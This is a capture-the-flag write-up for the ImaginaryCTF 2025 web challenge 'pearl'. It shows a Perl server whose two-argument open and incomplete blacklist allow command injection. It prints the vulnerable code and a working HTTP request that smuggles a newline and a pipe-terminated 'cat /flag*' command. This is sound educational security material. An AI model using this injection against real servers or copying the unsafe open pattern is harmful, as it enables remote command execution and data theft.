---
title: "web/ pearl - ImaginaryCTF 2025"
category: "web"
subcategory: "rce"
type: "writeup"
tags: ["perl", "web", "command-injection", "pearl", "rce", "imaginaryctf", "imaginaryctf-2025", "2025", "ctf-writeup"]
summary: "The “pearl” challenge is about abusing Perl’s two-argument open on unsanitized user input, which silently enables pipe opens (command execution) when the filename ends with a |."
source:
  name: "CTFtime writeup #40430"
  url: "https://ctftime.org/writeup/40430"
original_source: "https://blog.hitc.at/posts/ctf/imaginaryctf-2025/pearl/"
ctf:
  name: "ImaginaryCTF 2025"
  year: 2025
  challenge: "web/ pearl"
---

## Metadata

- **CTF:** ImaginaryCTF 2025
- **Task:** web/ pearl
- **Author team:** fish3r
- **CTFtime tags:** perl, web, command_injection
- **CTFtime:** <https://ctftime.org/writeup/40430>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/imaginaryctf-2025/pearl/>

---
## Introduction

The **“pearl”** challenge is about abusing **Perl’s two-argument `open`** on **unsanitized user input**, which silently enables **pipe opens (command execution)** when the filename ends with a `|`. The server also **URL-decodes** the path, so we can inject a newline and arguments. A partial blacklist misses this single trailing pipe case, letting us execute `cat /flag*` and read the flag.

### Context Explanation

* Tech: custom HTTP server using **`HTTP::Daemon`** (Perl), serving files from `./files` (see [`[server.pl](http://server.pl)`](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/server.pl>)).  
* Entry point: **request path** (after URL decoding) is used to build a filesystem path, then passed to **two-arg `open`**.  
* “Sanitization”: a **blacklist regex** tries to block `..`, some shell metacharacters, and `|.*|`, but **does not** block a **single trailing `|`** and **does not** block **newlines**.  
* Flag: built at container start (`flag.txt` moved/renamed to `/flag-<md5>.txt`), so `/flag*` reliably matches.

```docker  
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt  
```  
### Directive

1\. Craft a request path that, after URL-decoding, injects a **newline** and a **shell command** ending with a **trailing pipe** `|`.  
2\. Hit the server with that path so the **two-arg `open`** treats it as a **pipe open** and executes our command.  
3\. Use a **glob** `/flag*` to catch the randomized flag filename and read it.

\---

## Solution

### 1) Server behavior & vulnerable code

Relevant pieces from [**`[server.pl](http://server.pl)`**](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/server.pl):>

```perl  
my $webroot = "./files";  
...  
while (my $r = $c->get_request) {  
if ($r->method eq 'GET') {  
my $path = CGI::unescape($r->uri->path); # URL-decodes (%0A => newline)  
$path =~ s|^/||;  
$path ||= 'index.html';

my $fullpath = File::Spec->catfile($webroot, $path);

# Partial blacklist — note it only bans a pipe WHEN followed by ... another pipe  
if ($fullpath =~ /\\.\\.|[,\\`\\)\\(;&]|\|.*\|/) {  
$c->send_error(RC_BAD_REQUEST, "Invalid path");  
next;  
}  
...  
# Serve file  
open(my $fh, $fullpath) or do { # <\-- two-arg open on untrusted string  
$c->send_error(RC_INTERNAL_SERVER_ERROR, "Could not open file.");  
next;  
};  
binmode $fh;  
my $content = do { local $/; <$fh> };  
close $fh;  
...  
```

Key points:

* **`CGI::unescape`** decodes `%0A` to a **literal newline** inside `$path`.  
* The regex **does not** forbid a **single trailing `|`**; it only matches `\|.*\|` (a pipe, some stuff, then another pipe).  
* **Two-argument `open`** on a string that **ends with `|`** turns into a **pipe read** from the preceding shell command (Perl feature).  
→ If `$fullpath` becomes e.g. `"./files/x\ncat /flag*|"`, Perl executes **`cat /flag*`** and pipes its output into `$fh`.

> \\[Screenshot: `[server.pl](http://server.pl)` showing the blacklist line and the `open(my $fh, $fullpath)` call]

Also from [**`Dockerfile`**](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/Dockerfile):>

```dockerfile  
COPY flag.txt /  
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt  
```

This is why `/flag*` is a reliable glob target for the flag.

\---

### 2) PoC request (as provided) — newline + trailing pipe

The provided PoC (**`pearl/poc/pearl.txt`**) sends a raw HTTP request:

```http  
GET /x%0Acat%20/flag*%7C HTTP/1.1  
Host: [pearl.chal.imaginaryctf.org](http://pearl.chal.imaginaryctf.org)  
Connection: keep-alive  
```

URL-decoded path becomes:

```  
/x  
cat /flag*|  
```

* Line 1 is a **dummy filename** under `./files/` (likely non-existent).  
* Line 2 is the **shell command** we want the Perl `open` to execute (because it **ends with `|`**).  
* Net effect: two-arg `open` treats `$fullpath` as a **pipe**, runs `cat /flag*`, and returns the flag content.

![Flag](<https://blog.hitc.at/images/imaginaryctf2025/web/pearl_flag.png>)

\---

### 3) Why it works (concise)

* **Two-arg `open`** on an **untrusted scalar** enables **special modes**: a trailing `|` is a **pipe open** (command execution).  
* The **blacklist** misses the **single trailing `|`** pattern and **doesn’t strip newlines**, letting us **smuggle a separate shell command** after a filename.  
* `CGI::unescape` ensures `%0A` becomes a **real newline** inside the “filename.”  
* `/flag*` matches the randomized flag file produced at container startup.
